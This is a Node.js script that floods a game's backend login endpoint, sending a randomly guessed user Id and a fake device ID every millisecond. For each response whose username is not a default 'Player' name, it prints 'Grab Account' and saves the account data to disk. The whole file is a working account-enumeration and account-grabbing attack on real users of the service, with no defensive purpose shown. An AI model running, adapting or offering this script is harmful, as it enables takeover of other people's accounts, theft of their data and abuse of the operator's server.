const fetch = require('node-fetch');
const fs = require('fs');
function uid() {
    return (performance.now().toString(36)+Math.random().toString(36)).replace(/\./g,"");
};

setInterval(() => {
fetch('http://kitkabackend.eastus.cloudapp.azure.com:5010/user/login', {
    method: 'POST',
    headers: {
        "use_response_compression": "true",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip",
        "Host": "kitkabackend.eastus.cloudapp.azure.com:5010"
    },
    body: JSON.stringify({
        "Id": Math.floor(Math.random() * 10**(9-1), 10**9-1),
        "DeviceId": uid(),
        "Version": "0.37",
        "FacebookId": "",
        "GoogleId": "",
    })
}).then(res => res.json()).then(response => {
    if (!response["User"]["Username"].includes("Player")) {
        console.log(`Grab Account: ${response["User"]["Username"]}`);
        fs.writeFileSync(`./data/${response["User"]["Username"]}.json`, JSON.stringify(response, null, 2));
    }
}).catch(err => {
});
}, 1);

